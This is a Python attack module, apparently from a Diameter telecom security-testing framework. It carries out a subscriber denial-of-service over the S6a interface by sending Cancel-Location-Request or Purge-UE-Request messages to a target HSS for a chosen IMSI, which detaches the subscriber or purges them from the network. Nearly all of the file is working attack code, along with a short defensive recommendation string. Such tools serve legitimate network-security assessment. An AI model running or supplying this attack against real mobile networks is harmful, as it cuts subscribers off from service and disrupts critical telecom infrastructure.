#!/usr/bin/env python3
'''
S6a subscriber Denial of Service: Cancel-Location-Request (CLR) and
Purge-UE-Request (PUR).

Both detach a subscriber from the network from the HSS side:
  * CLR tells the serving MME to release the subscriber's EMM context
    (subscription-withdrawal cancellation type forces a full detach).
  * PUR marks the UE as purged in the HSS, requiring a fresh Attach.

    main(config_file, target, listening, verbosity, output_file, mode)
'''
from diameter.diameter_core.diameter_config_parser import DiameterConfig
from diameter.diameter_core.messages.s6a import (
    cancel_location_request, purge_ue_request)
from diameter.attacks.runner import targets, open_s6a, send_and_report
from diameter.commons.utilities import logErr, logInfo, logWarn

TAG = 'S6A-DoS'

RECOMMENDATION = ('an HSS/MME must reject CLR/PUR that do not originate from '
                  'the subscriber\'s legitimate serving node; unauthorized '
                  'acceptance lets any reachable Diameter peer detach '
                  'subscribers at will.')


def main(config_file, target, listening=True, verbosity=2, output_file=None,
         mode='cancel'):
    if not config_file:
        logErr('Set a config file ("set config <file>") with the [IES] IMSI.',
               TAG=TAG)
        return
    if not target:
        logErr('No target set. Use "set target <hss-ip>".', TAG=TAG)
        return
    try:
        cfg = DiameterConfig(config_file)
    except Exception as e:
        logErr('Bad config: %s' % e, TAG=TAG)
        return

    logWarn('S6a subscriber DoS (%s) against IMSI %s' % (mode, cfg.imsi), TAG=TAG)

    results = []
    for host in targets(target):
        conn, _, _ = open_s6a(cfg, host, TAG)
        if conn is None:
            continue
        try:
            if mode == 'purge':
                msg = purge_ue_request(cfg.origin_host, cfg.origin_realm,
                                       cfg.dest_realm, cfg.imsi,
                                       dest_host=cfg.dest_host)
                success = 'subscriber %s purged from HSS' % cfg.imsi
            else:
                msg = cancel_location_request(cfg.origin_host, cfg.origin_realm,
                                              cfg.dest_realm, cfg.imsi,
                                              dest_host=cfg.dest_host)
                success = 'subscriber %s cancelled/detached' % cfg.imsi
            code = send_and_report(conn, host, msg, TAG, success, RECOMMENDATION)
            results.append((host, code))
        finally:
            conn.close()

    if not results:
        logInfo('No HSS answered the %s request.' % mode, TAG=TAG)
    return results
